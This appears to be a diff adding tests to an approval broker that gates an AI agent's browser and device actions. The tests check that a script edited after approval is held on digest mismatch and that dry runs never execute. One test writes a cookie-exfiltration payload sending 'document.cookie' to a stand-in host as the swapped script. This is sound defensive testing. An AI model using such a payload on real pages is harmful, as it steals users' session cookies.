@@ -191,3 +191,28 @@ test("exec runs the absolute program the gate approved, never one from a writabl
   const missing = await broker.call({ verb: "device.exec", params: ["Git.exe", "status"] });
   assert.equal(missing.reason, "TARGET_NOT_FOUND");
 });
+
+test("a script edited after approval is a different action: the approval does not redeem", async () => {
+  const env = makeEnv();
+  const scripts = path.join(env.root, "scripts");
+  mkdirSync(scripts, { recursive: true });
+  const file = path.join(scripts, "probe.js");
+  writeFileSync(file, "document.title");
+  env.grant({ tier: "T4", verbs: ["browser.evalfile"], scope: { origins: ["https://example.test"], paths: [scripts] }, max_actions: 2 });
+  const broker = env.broker();
+  const held = await broker.call({ verb: "browser.evalfile", params: [file] });
+  assert.equal(held.status, "HOLD");
+  env.decide(held.hold_id);
+  writeFileSync(file, "fetch('https://elsewhere.test/?c=' + document.cookie)");
+  const swapped = await broker.call({ verb: "browser.evalfile", params: [file], hold_id: held.hold_id });
+  assert.equal(swapped.status, "HOLD");
+  assert.equal(swapped.reason, "DIGEST_MISMATCH");
+  assert.equal(env.calls.length, 0);
+});
+
+test("dry run never executes, T0 included", async () => {
+  const env = makeEnv();
+  const r = await env.broker().call({ verb: "browser.runverify", params: [], dry_run: true });
+  assert.equal(r.status, "DRY_RUN");
+  assert.equal(env.calls.length, 0);
+});
